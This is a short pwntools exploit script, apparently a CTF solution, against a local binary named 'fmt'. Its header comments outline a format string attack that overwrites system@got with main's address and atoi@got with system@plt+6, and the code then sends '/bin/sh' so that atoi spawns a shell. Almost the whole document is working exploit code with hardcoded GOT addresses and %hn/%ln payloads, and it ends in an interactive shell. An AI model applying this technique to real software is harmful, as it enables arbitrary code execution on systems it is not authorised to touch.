##########################################################################################################

# 1 - overwrite system@got with main address to get an infinite loop
# 2 - overwrite atoi@got with system@plt+6 to call the dl_runtime_resolve and jump to system@libc
# 3 - when it asks for a number for a name we'll send "/bin/sh" in order to call atoi("/bin/sh") which is system("/bin/sh")

###########################################################################################################

from pwn import *
p = process("./fmt")
systemgot = 0x0000000000404028
main = 0x4011f7
to_write = 0x401056
aoti_got = 0x0000000000404058
sprintf_got = 0x0000000000404038
payload = ""
payload += "%" + str(0x11f7) + "x"
payload += "%10$hn"
payload += "A"*(32-len(payload))
payload += p64(systemgot)
p.recvuntil("Choice: ")
p.sendline("2")
p.recvuntil("gift.\n")
p.sendline(payload)
payload = ""
payload += "%" + str(to_write) + "x"
payload += "%10$ln"
payload += "A"*(32-len(payload))
payload += p64(aoti_got)
p.recvuntil("Choice: ")
p.sendline("2")
p.recvuntil("gift.\n")
pause()
p.sendline(payload)
p.sendline("/bin/sh\x00")
p.interactive()
